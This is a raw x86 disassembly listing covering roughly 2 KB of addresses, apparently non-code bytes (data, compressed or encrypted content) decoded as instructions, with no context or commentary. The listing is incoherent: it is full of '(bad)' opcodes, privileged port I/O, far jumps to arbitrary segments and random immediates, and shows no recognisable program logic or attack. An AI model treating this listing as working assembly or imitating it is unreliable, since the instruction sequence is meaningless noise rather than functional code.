  4193c7:	cmp    edx,DWORD PTR [eax-0x1f]
  4193ca:	aad    0xbe
  4193cc:	test   ebx,esp
  4193ce:	fwait
  4193cf:	test   eax,0xe5e38381
  4193d5:	arpl   WORD PTR [esi-0xa92a791],ax
  4193db:	add    al,0x9b
  4193dd:	test   al,0x77
  4193df:	int    0xac
  4193e1:	cmp    BYTE PTR [edi-0x1d],ch
  4193e4:	fwait
  4193e5:	xchg   ecx,eax
  4193e6:	out    0x85,eax
  4193e8:	popa   
  4193e9:	xchg   edi,eax
  4193ea:	push   esp
  4193eb:	stos   BYTE PTR es:[edi],al
  4193ec:	and    BYTE PTR [edx],dh
  4193ee:	cld    
  4193ef:	jecxz  0x4193b7
  4193f1:	pop    edx
  4193f2:	outs   dx,BYTE PTR ds:[esi]
  4193f3:	(bad)  
  4193f5:	(bad)  [ebx+0x4c]
  4193f8:	lea    ebp,[esi+0x4]
  4193fb:	push   0x24
  4193fd:	or     eax,0xa76c9b26
  419402:	mov    edi,0xcfa68fe7
  419407:	(bad)  
  419408:	and    ch,BYTE PTR [ecx]
  41940a:	inc    ebx
  41940b:	imul   eax,DWORD PTR [ecx-0x37],0xffffffff
  41940f:	xchg   ecx,eax
  419410:	pop    ss
  419411:	fwait
  419412:	mov    al,0x22
  419414:	lods   al,BYTE PTR ds:[esi]
  419415:	addr16 push ebp
  419417:	dec    edx
  419418:	jne    0x419452
  41941a:	mov    bl,0x4e
  41941c:	xlat   BYTE PTR ds:[ebx]
  41941d:	out    dx,al
  41941e:	das    
  41941f:	push   edx
  419420:	dec    ecx
  419421:	std    
  419422:	jnp    0x419468
  419424:	ja     0x419468
  419426:	cdq    
  419427:	nop
  419428:	pop    ebx
  419429:	pop    eax
  41942a:	scas   al,BYTE PTR es:[edi]
  41942b:	test   eax,0xa417941d
  419430:	jl     0x419456
  419432:	jmp    0x40c1:0x6fe50f15
  419439:	adc    al,0x86
  41943b:	jae    0x56ed8e2d
  419441:	pushf  
  419442:	bound  ecx,QWORD PTR [ebp+0xfed5e21]
  419448:	push   esi
  419449:	mov    ah,0xa8
  41944b:	in     al,0x6
  41944d:	cmp    al,0xd0
  41944f:	pop    ebx
  419450:	mov    ch,0xc
  419452:	retf   0xf45e
  419455:	das    
  419456:	or     al,0xbd
  419458:	jp     0x41944d
  41945a:	push   0x6a
  41945c:	mov    bh,0x11
  41945e:	xor    eax,0x5fb2965e
  419463:	pop    ebp
  419464:	pop    ebp
  419465:	rcr    BYTE PTR [esi-0x46ef8dbd],1
  41946b:	stc    
  41946c:	inc    ebx
  41946d:	pop    ebp
  41946e:	lods   al,BYTE PTR ds:[esi]
  41946f:	sub    edi,esp
  419471:	in     al,dx
  419472:	cli    
  419473:	stos   DWORD PTR es:[edi],eax
  419474:	or     bl,BYTE PTR [ebx-0x2b030cb4]
  41947a:	mov    ebx,0xacb5f024
  41947f:	jnp    0x419470
  419481:	pop    es
  419482:	aaa    
  419483:	in     al,0x66
  419485:	xchg   edi,eax
  419486:	jmp    0x20b41e56
  41948b:	sbb    ebx,ebx
  41948d:	inc    eax
  41948e:	test   al,0x45
  419490:	ds ret 
  419492:	mov    eax,0x290eff0e
  419497:	push   0x6a3c2a59
  41949c:	dec    eax
  41949d:	inc    edx
  41949e:	das    
  41949f:	push   edi
  4194a0:	fdiv   st,st(3)
  4194a2:	jmp    0x2464:0x28a94b0b
  4194a9:	leave  
  4194aa:	ror    BYTE PTR [ebp+0x79],cl
  4194ad:	and    BYTE PTR [ecx-0x65],bl
  4194b0:	out    0x95,al
  4194b2:	cmp    al,0xee
  4194b4:	retf   0xe91f
  4194b7:	out    dx,al
  4194b8:	add    al,0xbc
  4194ba:	xor    edx,edx
  4194bc:	push   esp
  4194bd:	mov    ds:0x89cd9eb8,al
  4194c2:	jecxz  0x419468
  4194c4:	push   es
  4194c5:	into   
  4194c6:	cmp    edi,esi
  4194c8:	pop    ecx
  4194c9:	add    edx,DWORD PTR [edi]
  4194cb:	sbb    cl,al
  4194cd:	xchg   edi,eax
  4194ce:	mov    WORD PTR [eax],?
  4194d0:	mov    ebx,0x923e1920
  4194d5:	bound  edx,QWORD PTR [ebx+0x35]
  4194d8:	add    al,0x56
  4194da:	ds scas al,BYTE PTR es:[edi]
  4194dc:	jno    0x419465
  4194de:	xor    al,BYTE PTR [eax]
  4194e0:	loope  0x419482
  4194e2:	imul   edx,DWORD PTR [esi-0x32a96d1b],0x7e
  4194e9:	mov    esi,0x974e99c8
  4194ee:	mov    ebx,0xeda96e6c
  4194f3:	push   ecx
  4194f4:	mov    eax,0x2b43be55
  4194f9:	jle    0x41948c
  4194fb:	cwde   
  4194fc:	das    
  4194fd:	ins    DWORD PTR es:[edi],dx
  4194fe:	add    BYTE PTR [eax+0x32af7049],bh
  419504:	mov    DWORD PTR [eax-0x64d14830],ecx
  41950a:	mov    dl,0x76
  41950c:	sti    
  41950d:	mov    cl,0x7d
  41950f:	dec    ecx
  419510:	les    eax,FWORD PTR [edx-0x47d52b9c]
  419516:	mov    esi,0xca43450b
  41951b:	scas   al,BYTE PTR es:[edi]
  41951c:	in     eax,0x4c
  41951e:	inc    esi
  41951f:	fdivr  st,st(7)
  419521:	loope  0x41952c
  419523:	push   esi
  419524:	popf   
  419525:	mov    bh,0xcf
  419527:	pop    edx
  419528:	leave  
  419529:	push   0xb4234156
  41952e:	mov    bl,BYTE PTR [esi+eax*2+0x54]
  419532:	fadd   DWORD PTR ds:0x80125e9a
  419539:	cmp    BYTE PTR [ecx-0x9ed958e],cl
  41953f:	xchg   ebp,eax
  419540:	push   edx
  419541:	loopne 0x4194ff
  419543:	jnp    0x419510
  419545:	jo     0x419537
  419547:	mov    bl,0x47
  419549:	jno    0x4195bf
  41954b:	in     al,dx
  41954c:	daa    
  41954d:	mov    ch,0xae
  41954f:	rcl    BYTE PTR [ecx+0x3602c9ce],1
  419555:	sub    DWORD PTR [edi+0x26],ecx
  419558:	xor    edx,DWORD PTR [eax+0x18aacd1e]
  41955e:	mov    ds:0x409e434,eax
  419563:	mov    esp,0x61f82967
  419568:	or     esp,ebp
  41956a:	sbb    DWORD PTR [ecx+0x4e],0x5
  41956e:	test   DWORD PTR [ecx-0xc7434ad],esp
  419574:	lds    esi,FWORD PTR [ecx-0x5a]
  419577:	inc    edx
  419578:	or     edi,eax
  41957a:	mov    ebp,0xb7009814
  41957f:	jecxz  0x41953a
  419581:	pop    esp
  419582:	mov    al,0x8f
  419584:	fsubr  DWORD PTR [esi]
  419586:	pop    ds
  419587:	loopne 0x41956c
  419589:	lods   eax,DWORD PTR ds:[esi]
  41958a:	mov    ds:0x2c0c3b46,eax
  41958f:	mov    al,0x32
  419591:	shr    BYTE PTR [edx+eiz*4+0xe8731cd],cl
  419598:	sbb    al,0xf2
  41959a:	fidiv  DWORD PTR ds:0x42c4f960
  4195a0:	xchg   edi,eax
  4195a1:	fldcw  WORD PTR ss:[ecx+ebp*4-0x2213e2ed]
  4195a9:	loope  0x4195f7
  4195ab:	xchg   edx,eax
  4195ac:	mov    edx,0x5e380d11
  4195b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195b2:	int3   
  4195b3:	nop
  4195b4:	and    dl,al
  4195b6:	add    DWORD PTR [ebx+0x40c29df],esi
  4195bc:	sbb    ah,BYTE PTR [ebp+ebp*1-0x3b]
  4195c0:	or     BYTE PTR [eax-0x1db8fca2],ah
  4195c6:	xchg   edi,eax
  4195c7:	jae    0x419584
  4195c9:	add    edi,ebp
  4195cb:	packuswb mm1,mm6
  4195ce:	popf   
  4195cf:	stos   DWORD PTR es:[edi],eax
  4195d0:	or     al,0xb2
  4195d2:	adc    dl,BYTE PTR [ecx+0x6e]
  4195d5:	nop
  4195d6:	icebp  
  4195d7:	push   eax
  4195d8:	push   es
  4195d9:	jecxz  0x419562
  4195db:	je     0x4195fb
  4195dd:	jbe    0x41961d
  4195df:	mov    eax,0x6edb11ca
  4195e4:	xor    al,0xc3
  4195e6:	in     eax,0xc0
  4195e8:	mov    al,ds:0x8e82f0e5
  4195ed:	push   cs
  4195ee:	into   
  4195ef:	(bad)  
  4195f0:	and    al,0xa0
  4195f2:	mov    eax,0xf249d6cf
  4195f7:	mov    edi,0x3133ee2b
  4195fc:	mov    dl,0xbf
  4195fe:	dec    edi
  4195ff:	add    eax,0x1c586e1a
  419604:	jle    0x4195b6
  419606:	lahf   
  419607:	mov    bl,0x24
  419609:	mov    esp,0x41bf6fbd
  41960e:	call   0xe4e5a05a
  419613:	(bad)  
  419614:	xchg   edx,eax
  419615:	mov    ecx,0xafaaa940
  41961a:	push   edi
  41961b:	add    BYTE PTR [eax-0x3c521853],0xda
  419622:	xor    BYTE PTR [edx+0xfff7455],bl
  419628:	fwait
  419629:	jecxz  0x4195bb
  41962b:	adc    BYTE PTR [esp+edi*8-0x6],0x4
  419630:	sbb    eax,0x4ab443dd
  419635:	cmp    BYTE PTR [esp+ebp*8-0x4ba0338e],cl
  41963c:	std    
  41963d:	mov    al,ds:0x66fa3bbd
  419642:	mov    edx,0x2acaa97f
  419647:	leave  
  419648:	rcpps  xmm0,XMMWORD PTR [eax-0x35c7f416]
  41964f:	xchg   edi,eax
  419650:	or     eax,0x2a02c35f
  419655:	imul   ebp,DWORD PTR [edx-0x62],0x70
  419659:	sahf   
  41965a:	fldenv [ebp+eiz*4-0x7]
  41965e:	mov    eax,ds:0x1c584f69
  419663:	xchg   ebp,eax
  419664:	pop    ebp
  419665:	jmp    0x4195fb
  419667:	mov    ebx,0xa0cde3cc
  41966c:	xor    eax,0xe978cc5f
  419671:	jg     0x4195f3
  419673:	or     bl,BYTE PTR [esi-0x72]
  419676:	jns    0x41969e
  419678:	iret   
  419679:	pop    edx
  41967a:	(bad)  
  41967b:	push   esp
  41967c:	xchg   esi,eax
  41967d:	std    
  41967e:	scas   eax,DWORD PTR es:[edi]
  41967f:	data16 icebp 
  419681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419682:	mov    al,0x9a
  419684:	mov    DWORD PTR [ebx],ecx
  419686:	sahf   
  419687:	arpl   WORD PTR [ecx-0xd21207f],ax
  41968d:	dec    esp
  41968e:	mov    cl,BYTE PTR [edx+0x41]
  419691:	(bad)  
  419692:	mov    ecx,DWORD PTR [esi]
  419694:	inc    edi
  419695:	in     al,dx
  419696:	daa    
  419697:	das    
  419698:	fs (bad) 
  41969a:	test   al,0x9e
  41969c:	mov    ecx,es
  41969e:	dec    edx
  41969f:	cwde   
  4196a0:	hlt    
  4196a1:	pop    esi
  4196a2:	cmp    al,0xcf
  4196a4:	cmp    BYTE PTR [ebp+0x64],ch
  4196a7:	add    eax,0x50996f6b
  4196ac:	pop    edi
  4196ad:	push   0x4e
  4196af:	call   0x162180f
  4196b4:	mov    edi,0x618c7dae
  4196b9:	or     al,0xc0
  4196bb:	push   ds
  4196bc:	or     BYTE PTR [ebx],0x77
  4196bf:	loopne 0x41970c
  4196c1:	fldcw  WORD PTR ds:[edi+eiz*8+0x4]
  4196c6:	das    
  4196c7:	(bad)  
  4196c8:	icebp  
  4196c9:	mov    al,0xb4
  4196cb:	pop    esp
  4196cc:	(bad)
  4196d0:	mov    ds:0x2fc5052a,al
  4196d5:	test   al,0x53
  4196d7:	xor    edi,edi
  4196d9:	outs   dx,DWORD PTR ds:[esi]
  4196da:	jmp    0x4196ac
  4196dc:	cli    
  4196dd:	sub    esi,DWORD PTR ds:0xba7cb809
  4196e3:	dec    esp
  4196e4:	call   0xa6e1bed5
  4196e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196ea:	jle    0x419735
  4196ec:	(bad)  
  4196ed:	outs   dx,BYTE PTR ds:[esi]
  4196ee:	cmp    al,0x2a
  4196f0:	cdq    
  4196f1:	fmulp  st(1),st
  4196f3:	xchg   ebp,eax
  4196f4:	xchg   cl,dh
  4196f6:	sub    cl,BYTE PTR [esi+0x77]
  4196f9:	add    eax,0x589d514
  4196fe:	jbe    0x419753
  419700:	sub    eax,0x24e4b3c3
  419705:	pop    edi
  419706:	jle    0x419732
  419708:	pop    ecx
  419709:	cdq    
  41970a:	das    
  41970b:	arpl   WORD PTR [eax],bp
  41970d:	fldlg2 
  41970f:	lods   al,BYTE PTR ds:[esi]
  419710:	xor    eax,0xacdab88a
  419715:	pop    ebp
  419716:	bound  ebp,QWORD PTR [edi+0x8c19787]
  41971c:	pop    DWORD PTR [ecx]
  41971e:	icebp  
  41971f:	and    al,0x6c
  419721:	pusha  
  419722:	test   DWORD PTR [esi-0x2e4a9dc7],0x36e904f7
  41972c:	or     ebx,ebp
  41972e:	sub    DWORD PTR [ebp-0x1309c24a],esi
  419734:	into   
  419735:	or     DWORD PTR [edi+0x53],edx
  419738:	add    ch,BYTE PTR cs:[esi-0x4c]
  41973c:	xchg   ecx,eax
  41973d:	jnp    0x4197ac
  41973f:	aad    0xaf
  419741:	add    al,0xb9
  419743:	jmp    0x2d99:0xb062c4b2
  41974a:	sar    DWORD PTR [edi],cl
  41974c:	jno    0x419799
  41974e:	jle    0x4197a8
  419750:	lds    edi,FWORD PTR [edx]
  419752:	test   BYTE PTR [ebx],0x3f
  419755:	adc    bl,BYTE PTR [ebx]
  419757:	fild   DWORD PTR [ebx+0x28]
  41975a:	stos   DWORD PTR es:[edi],eax
  41975b:	lahf   
  41975c:	adc    eax,0xe1fbe727
  419761:	and    al,dl
  419763:	jmp    0xa643:0xe23bbbce
  41976a:	pop    esp
  41976b:	sbb    BYTE PTR [ebx+0x1f2c85e9],al
  419771:	mov    esi,0x4e08681c
  419776:	test   BYTE PTR [edi],dh
  419778:	fisttp QWORD PTR [ebx+eiz*8-0x5cae797]
  41977f:	adc    bh,BYTE PTR [edx-0x24]
  419782:	pushf  
  419783:	jge    0x419797
  419785:	fisub  DWORD PTR [edi+0x54]
  419788:	xchg   edx,eax
  419789:	and    ecx,DWORD PTR [ebx+ecx*4-0x79f959a2]
  419790:	retf   0x93ff
  419793:	xor    DWORD PTR [ebx-0x127a0189],esp
  419799:	out    0xab,al
  41979b:	daa    
  41979c:	arpl   ax,sp
  41979e:	jae    0x41972f
  4197a0:	and    ebp,DWORD PTR [edi]
  4197a2:	popf   
  4197a3:	jg     0x419817
  4197a5:	in     al,0x9
  4197a7:	and    al,0x5a
  4197a9:	jns    0x419798
  4197ab:	ins    DWORD PTR es:[edi],dx
  4197ac:	mov    BYTE PTR [esi-0x75047dff],ch
  4197b2:	sub    ebp,DWORD PTR [edi+0x743e19d6]
  4197b8:	stc    
  4197b9:	enter  0x20a3,0xca
  4197bd:	scas   al,BYTE PTR es:[edi]
  4197be:	pop    esi
  4197bf:	jnp    0x4197af
  4197c1:	retf   
  4197c2:	pop    ds
  4197c3:	xabort 0xd
  4197c6:	sti    
  4197c7:	cdq    
  4197c8:	jo     0x4197b8
  4197ca:	sahf   
  4197cb:	(bad)  
  4197cd:	xor    ax,0xd34e
  4197d1:	push   esp
  4197d2:	dec    edi
  4197d3:	in     al,dx
  4197d4:	pop    ebp
  4197d5:	or     eax,0xa10acd49
  4197da:	test   eax,0xd676ede8
  4197df:	rol    BYTE PTR [ebx+ebx*2-0x234b3501],1
  4197e6:	mov    ebp,0x9003ba52
  4197eb:	test   eax,0x728ce0ed
  4197f0:	data16 fidiv DWORD PTR [esi-0x62fff2aa]
  4197f7:	rcl    DWORD PTR [ebx+0x37],1
  4197fa:	test   edx,edx
  4197fc:	mov    edx,0x1f2cf462
  419801:	fisubr DWORD PTR [edi-0x48f127fb]
  419807:	lahf   
  419808:	(bad)  
  419809:	lock jle 0x4197ec
  41980c:	pop    edx
  41980d:	pop    esi
  41980e:	cmp    ah,bl
  419810:	cmc    
  419811:	mov    DWORD PTR [edi],eax
  419813:	hlt    
  419814:	cmc    
  419815:	js     0x41987b
  419817:	xchg   esi,eax
  419818:	cli    
  419819:	ja     0x419839
  41981b:	xchg   ebx,eax
  41981c:	cmc    
  41981d:	jae    0x4197d9
  41981f:	out    0x8b,al
  419821:	xchg   ebp,eax
  419822:	loop   0x41982c
  419824:	aad    0x5
  419826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419827:	fsubr  QWORD PTR [edi+0xdd329d9]
  41982d:	push   ebx
  41982e:	xor    ebx,DWORD PTR [edx+0x31]
  419831:	jno    0x41989e
  419833:	push   ebx
  419834:	mov    ds:0x44125821,al
  419839:	and    bh,BYTE PTR [eax-0x51]
  41983c:	test   eax,0xeefd14cb
  419841:	mov    DWORD PTR ds:0x843d2303,esi
  419847:	mov    dh,0x32
  419849:	mov    eax,ds:0xecfb30b1
  41984e:	sub    eax,0xa9e223d4
  419853:	enter  0xc1f2,0xb1
  419857:	out    dx,al
  419858:	pop    es
  419859:	xor    DWORD PTR [ebp+0x62fcfc24],0xffffffae
  419860:	jmp    0x4198d9
  419862:	std    
  419863:	pop    edx
  419864:	(bad)  
  419865:	out    0x97,eax
  419867:	std    
  419868:	into   
  419869:	adc    BYTE PTR [edi-0x4f9c9617],bh
  41986f:	xor    bh,ah
  419871:	adc    BYTE PTR [eax],al
  419873:	std    
  419874:	das    
  419875:	(bad)  
  419876:	ins    DWORD PTR es:[edi],dx
  419877:	jno    0x41988a
  419879:	scas   al,BYTE PTR es:[edi]
  41987a:	enter  0x8234,0xc9
  41987e:	std    
  41987f:	add    ah,BYTE PTR [eax+0x21a62db9]
  419885:	cmp    BYTE PTR [edi+0x54c59dd6],dh
  41988b:	xor    DWORD PTR [edi+0x1dfd4bd0],ebx
  419891:	scas   eax,DWORD PTR es:[edi]
  419892:	pop    es
  419893:	and    dh,BYTE PTR [eax+0x42]
  419896:	sbb    DWORD PTR [ebp-0x39b6e01b],ebp
  41989c:	retf   0xccea
  41989f:	pop    edx
  4198a0:	mov    bl,0x91
  4198a2:	std    
  4198a3:	xor    DWORD PTR [ecx+ecx*8],edi
  4198a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198a7:	sti    
  4198a8:	cmp    edi,DWORD PTR [eax]
  4198aa:	repz mov ds:0xee59a219,al
  4198b0:	adc    DWORD PTR [eax-0x1042ec32],esp
  4198b6:	imul   dh
  4198b8:	add    al,0x3b
  4198ba:	loop   0x4198b4
  4198bc:	fldcw  WORD PTR [ebp+0x49]
  4198bf:	arpl   WORD PTR [ebx+0x48],di
  4198c2:	sub    dh,BYTE PTR ds:0x32794280
  4198c8:	cmp    esp,DWORD PTR ds:0x374fb2d0
  4198ce:	scas   al,BYTE PTR es:[edi]
  4198cf:	leave  
  4198d0:	test   BYTE PTR [esi],ah
  4198d2:	pushf  
  4198d3:	mov    ebx,0xef6f69e2
  4198d8:	push   ebp
  4198d9:	in     al,dx
  4198da:	sub    cl,BYTE PTR [ebp-0x7d]
  4198dd:	dec    ecx
  4198de:	or     ah,BYTE PTR [ebx-0x390e04f1]
  4198e4:	mov    ebp,0x681643f1
  4198e9:	sbb    eax,0x87673fbd
  4198ee:	and    eax,DWORD PTR [edx-0x61c71535]
  4198f4:	sbb    DWORD PTR ss:[ecx-0x1cfbd970],ebp
  4198fb:	mov    esp,0x92110ff3
  419900:	aad    0xe8
  419902:	int3   
  419903:	jle    0x419925
  419905:	dec    edi
  419906:	imul   eax,esi,0xffffffde
  419909:	popa   
  41990a:	shr    DWORD PTR [ebx],1
  41990c:	in     al,dx
  41990d:	sbb    ebp,ebp
  41990f:	loopne 0x419896
  419911:	loopne 0x419922
  419913:	xchg   esi,eax
  419914:	in     eax,0x33
  419916:	xchg   edx,eax
  419917:	sbb    al,0x4d
  419919:	mov    DWORD PTR [edi-0x5b],ecx
  41991c:	inc    esp
  41991d:	ds mov cl,0x58
  419920:	mov    eax,ds:0x2747f64
  419925:	adc    al,bl
  419927:	dec    edi
  419928:	pop    ecx
  419929:	add    esi,ebp
  41992b:	xor    DWORD PTR [ebx+ecx*2-0x6d],eax
  41992f:	fwait
  419930:	sbb    ecx,DWORD PTR [ebx-0x6b8ff7d0]
  419936:	sub    al,0x7c
  419938:	fwait
  419939:	cmp    al,0x23
  41993b:	fmul   QWORD PTR [bx+di+0x7106]
  419940:	adc    edx,DWORD PTR [ecx-0xa]
  419943:	adc    DWORD PTR [edi+0x68],ebx
  419946:	retf   0xf62f
  419949:	dec    ebx
  41994a:	and    al,0x8f
  41994c:	rcl    ebp,cl
  41994e:	into   
  41994f:	push   es
  419950:	lods   al,BYTE PTR ds:[esi]
  419951:	push   ds
  419952:	push   0x3e
  419954:	push   0x382b1003
  419959:	sub    eax,DWORD PTR [edx]
  41995b:	sahf   
  41995c:	mov    ebx,0xa1640477
  419961:	mov    bl,0x3f
  419963:	sub    eax,0xea0bb4ac
  419968:	add    al,0x2
  41996a:	dec    eax
  41996b:	aaa    
  41996c:	add    al,0x59
  41996e:	je     0x4199d6
  419970:	test   DWORD PTR [ecx],esi
  419972:	shl    DWORD PTR [esi+edx*1],1
  419975:	fs mov al,0xaa
  419978:	out    dx,al
  419979:	cs or  eax,0xec2d0bf1
  41997f:	in     al,0x17
  419981:	mov    ds:0x70db316e,eax
  419986:	cdq    
  419987:	push   eax
  419988:	dec    ebp
  419989:	scas   al,BYTE PTR es:[edi]
  41998a:	in     al,dx
  41998b:	popa   
  41998c:	adc    ah,bh
  41998e:	lea    eax,[ebx]
  419990:	push   0x7f02e8dc
  419995:	jmp    0x19aa8ec1
  41999a:	pusha  
  41999b:	xlat   BYTE PTR ds:[ebx]
  41999c:	rol    cl,0xdf
  41999f:	jge    0x419a03
  4199a1:	inc    esp
  4199a2:	ds mov cl,0xe
  4199a5:	or     cl,cl
  4199a7:	lods   al,BYTE PTR ds:[esi]
  4199a8:	repnz int 0x11
  4199ab:	sub    DWORD PTR [ecx+0x3a],esp
  4199ae:	inc    esp
  4199af:	(bad)  
  4199b0:	or     eax,0xee96bcd8
  4199b5:	fsubr  QWORD PTR [edi+0x745be1e5]
  4199bb:	pop    eax
  4199bc:	sub    BYTE PTR [ebx],ah
  4199be:	ja     0x419994
  4199c0:	xor    BYTE PTR [ebx+0x61],al
  4199c3:	aam    0xb2
  4199c5:	mov    dh,0x0
  4199c7:	sbb    al,0x5c
  4199c9:	int    0x7f
  4199cb:	jno    0x4199d5
  4199cd:	lea    edx,[ebx]
  4199cf:	sub    BYTE PTR [ebp+edi*4+0x462032cb],ah
  4199d6:	mov    BYTE PTR [ecx+0x5f],dh
  4199d9:	aam    0x72
  4199db:	push   ebp
  4199dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199dd:	pushf  
  4199de:	push   eax
  4199df:	lea    ebx,[ebp-0x6bbaf91]
  4199e5:	add    edi,eax
  4199e7:	mov    DWORD PTR [edi-0x47],ebx
  4199ea:	or     BYTE PTR [ecx],bh
  4199ec:	mov    al,ds:0xac57285d
  4199f1:	cmp    dl,BYTE PTR [esi+0x3369837e]
  4199f7:	lock int3 
  4199f9:	fsubr  QWORD PTR [edi]
  4199fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199fc:	mov    al,ds:0x792b8126
  419a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a02:	cdq    
  419a03:	test   dh,cl
  419a05:	inc    ecx
  419a06:	clc    
  419a07:	mov    ah,0x13
  419a09:	gs aas 
  419a0b:	test   ch,ch
  419a0d:	sbb    edi,DWORD PTR [ebp-0x24ac2619]
  419a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a14:	lock arpl WORD PTR [ecx],bp
  419a17:	leave  
  419a18:	lds    ebp,FWORD PTR [edx-0x28]
  419a1b:	neg    BYTE PTR [eax]
  419a1d:	aam    0xaf
  419a1f:	repz mov edi,gs
  419a22:	aad    0xbb
  419a24:	add    eax,DWORD PTR [ecx-0x5d537da3]
  419a2a:	xor    BYTE PTR [edi-0x59716f4f],ah
  419a30:	loopne 0x419a4d
  419a32:	pop    esp
  419a33:	cmp    edi,edi
  419a35:	adc    BYTE PTR [edi*1-0x16532c1c],dh
  419a3c:	jbe    0x4199be
  419a3e:	add    ah,BYTE PTR [ecx-0x689a08fe]
  419a44:	(bad)  
  419a45:	retf   
  419a46:	xor    cl,al
  419a48:	popa   
  419a49:	in     al,dx
  419a4a:	mov    ds:0x66c9e3db,eax
  419a4f:	xor    ecx,esp
  419a51:	mov    dh,0xe8
  419a53:	sbb    eax,0x33af1f4a
  419a58:	and    eax,0x147d6db8
  419a5d:	in     al,dx
  419a5e:	popa   
  419a5f:	js     0x419a1b
  419a61:	nop
  419a62:	aaa    
  419a63:	repz cmp DWORD PTR [ecx-0x296a612b],ecx
  419a6a:	repnz push esp
  419a6c:	imul   esp,DWORD PTR [esi],0xffffffc5
  419a6f:	xor    bh,BYTE PTR [ecx+0x64d8ae79]
  419a75:	fwait
  419a76:	sbb    al,0x85
  419a78:	movntq QWORD PTR [edx+0x2],mm6
  419a7c:	les    edx,FWORD PTR es:[edi+0x4d6717a2]
  419a83:	xchg   edx,eax
  419a84:	mov    dh,0xe8
  419a86:	push   0xffffffec
  419a88:	int    0x75
  419a8a:	fadd   st,st(4)
  419a8c:	imul   eax,DWORD PTR [ebx],0x1f85a815
  419a92:	mov    BYTE PTR [ebp+0x69],ch
  419a95:	(bad)  
  419a96:	out    dx,al
  419a97:	add    eax,0x7308b54d
  419a9c:	mov    ch,0x80
  419a9e:	cmp    eax,0x25f614e0
  419aa3:	ins    BYTE PTR es:[edi],dx
  419aa4:	sbb    al,bl
  419aa6:	adc    al,0x52
  419aa8:	jmp    0x419ab5
  419aaa:	inc    esp
  419aab:	jb     0x419a53
  419aad:	outs   dx,DWORD PTR ds:[esi]
  419aae:	sbb    BYTE PTR [esi-0x4fc7a732],ah
  419ab4:	retf   0x4ea3
  419ab7:	movq   QWORD PTR [ebx+eax*4],mm6
  419abb:	push   ss
  419abc:	pop    esi
  419abd:	jno    0x419adc
  419abf:	test   DWORD PTR [edx+0x49],edi
  419ac2:	push   ebp
  419ac3:	jb     0x419b02
  419ac5:	sbb    al,0xff
  419ac7:	gs enter 0x5e9c,0xfa
  419acc:	adc    al,0xef
  419ace:	imul   edx,esi,0x5ee84496
  419ad4:	dec    eax
  419ad5:	lahf   
  419ad6:	xor    ebp,DWORD PTR cs:[ebx*4+0x68fd47ee]
  419ade:	fcmovu st,st(7)
  419ae0:	or     ebx,edi
  419ae2:	les    edi,FWORD PTR [ebx-0x44]
  419ae5:	dec    edx
  419ae6:	aaa    
  419ae7:	jle    0x419ab2
  419ae9:	pop    ss
  419aea:	xor    eax,0xcc9c466d
  419aef:	and    ecx,edx
  419af1:	sbb    al,0x39
  419af3:	inc    edi
  419af4:	sbb    ecx,DWORD PTR [edi]
  419af6:	push   edi
  419af7:	xor    BYTE PTR [ecx-0x57],dl
  419afa:	aaa    
  419afb:	mov    edi,0x34d0eedc
  419b00:	int3   
  419b01:	jns    0x419ae0
  419b03:	jnp    0x419b1e
  419b05:	div    BYTE PTR [ebp-0x3d]
  419b08:	sbb    eax,0x90ee5a97
  419b0d:	jp     0x419b51
  419b0f:	ficom  WORD PTR [esi-0x5e0a5d5c]
  419b15:	push   cs
  419b16:	and    al,0x19
  419b18:	xlat   BYTE PTR ds:[ebx]
  419b19:	mov    eax,0xdb488b47
  419b1e:	outs   dx,BYTE PTR ds:[esi]
  419b1f:	push   ecx
  419b20:	sub    bl,ch
  419b22:	lahf   
  419b23:	(bad)  
  419b24:	fsubrp st(5),st
  419b26:	sbb    eax,0x2e5df0fd
  419b2b:	xor    eax,esp
  419b2d:	ins    DWORD PTR es:[edi],dx
  419b2e:	jb     0x419acf
  419b30:	jno    0x419b81
  419b32:	sub    ebp,DWORD PTR [edx]
  419b34:	mov    eax,0xe4e686e6
  419b39:	not    DWORD PTR [edx]
  419b3b:	pusha  
  419b3c:	mov    gs,WORD PTR [edx+0x54]
  419b3f:	pop    esp
  419b40:	push   edi
  419b41:	mov    ds:0xcc6567d,eax
  419b46:	sahf   
  419b47:	jl     0x419ba5
  419b49:	push   ebp
  419b4a:	mov    edx,0xba0e4372
  419b4f:	jmp    0x390c:0x8eb39233
  419b56:	mov    esi,0x99dabf4
  419b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b5c:	jns    0x419b79
  419b5e:	arpl   WORD PTR [ecx-0x4e094289],bp
  419b64:	out    dx,eax
  419b65:	xor    BYTE PTR [esi+esi*1+0x4290f06a],0xfd
  419b6d:	xor    esi,esi
  419b6f:	or     eax,0x6d89218f
  419b74:	fwait
  419b75:	add    eax,0x71042f91
  419b7a:	sbb    bl,BYTE PTR [esi]
  419b7c:	into   
  419b7d:	pop    esp
  419b7e:	cld    
  419b7f:	ins    DWORD PTR es:[edi],dx
  419b80:	bound  edx,QWORD PTR [ebx]
  419b82:	retf   0xbec5
  419b85:	test   al,0xa8
  419b87:	mov    ds:0x43ba0070,eax
  419b8c:	(bad)  
  419b8d:	cmp    bh,ah
  419b8f:	outs   dx,BYTE PTR ds:[esi]
  419b90:	adc    bl,BYTE PTR ds:0x1e4a19ab
  419b96:	pop    ebp
  419b97:	shl    BYTE PTR [esi+0x70],1
  419b9a:	cli    
  419b9b:	in     al,0x1d
  419b9d:	jmp    0x419b98
  419b9f:	leave  
  419ba0:	jns    0x419bdd
  419ba2:	nop
  419ba3:	cld    
  419ba4:	adc    eax,0x2aec3fd8
  419ba9:	test   BYTE PTR [edi],al
  419bab:	mov    ds:0x6c87abd8,al
  419bb0:	and    al,0x5d
  419bb2:	or     BYTE PTR [edi+eiz*4+0x18],ah
  419bb6:	fisttp DWORD PTR [ebp+esi*1+0x56b33e9]
  419bbd:	mov    ecx,0xde77374b
  419bc2:	jns    0xa61ad9d9
  419bc8:	mov    bl,0x53
  419bca:	imul   eax,DWORD PTR [ecx-0x277b8914],0xffffffea
